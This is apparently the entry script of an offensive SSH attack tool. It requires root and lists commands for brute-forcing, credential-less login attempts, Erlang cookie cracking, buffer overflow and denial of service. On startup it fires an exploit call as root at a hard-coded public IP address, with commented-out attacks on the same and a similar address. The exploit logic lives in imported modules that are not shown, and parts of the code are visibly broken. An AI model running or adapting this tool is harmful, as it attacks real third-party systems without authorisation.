#!/bin/env python
import main
import os 
import exploits
import connect_listen
import paramiko
import logging
import exploits
import pyshark

commands_user = [ "brute-connect", "user-auth-connect", "hexdump", "transport-info",
"read-connect", "jump-hosts", "connect-known-hosts", "xml-parse-overflow", "erlang-cookie-connect",
"erlang-cookie-brute", "free-pointer-ddos", "x11-transversal", "malformed-packet", "capture-handshake", "port-foward", "ssh-buffer-overflow","malformed-gss-packet", "cipher-memory", "map-channel", "print-cipher-table" ]

commands_debug = ["set-hex-dump", "set-dump-all", "show-net"]


def check_root_user():
     if os.geteuid() != 0:
      exit("You need to have root privileges to run this script.\nPlease try" )

def get_main(hostname, port, username, password):
 return main.main(hostname , port  , username , password  , multithreading = False, logs = False, myfile = (open("network.txt"), "r+"), passfile = (open("pass.txt"), "r+") )

def exploit(hostname, port, username, password):
 return exploits.exploits(hostname, port , username, password )



def run():
  print("--> Documentation may be found at https://github.com/breadforhire/interpy")
  print("     \      ,")
  print("     l\   ,/")
  print("._   `|] /j")
  print(" `\\, \|f7 _,/'")
  print("   `=,k/,x-")
  print("    ,z/fY-=-")
  print("  - .y ")
  print("      '   \itz")
  print(commands_user)

#  session_id = exploit(hostname="107.22.232.39", port = 22, username = "root", password = None).memory_reg()
  #exploit(hostname="107.22.32.39", port = 22, username = "root", password = None)._pointer_denial()
  exploit(hostname="107.22.232.39", port = 22, username = "root", password = None).parse_map()
  while True:
   input_command = input(str)

   if commands_user[0] == input_command:
     get_main(hostname = input("Hostname: "), port = 22, username = input("Username: "), password = None).bruteforce()
   if commands_user[1] == input_command:
     get_main(input("Hostname: "), port = 22, username = input("Username: "), password = None).connect_auth_no_cred()
   if commands_user[2] == input_command:
     get_main(None, port = 22, username = None, password = None)()._read_network()
   if commands_user[3] == input_command:
     get_main().hexdump()
   if commands_user[4] == input_command:
     get_main().info()


check_root_user()
run()
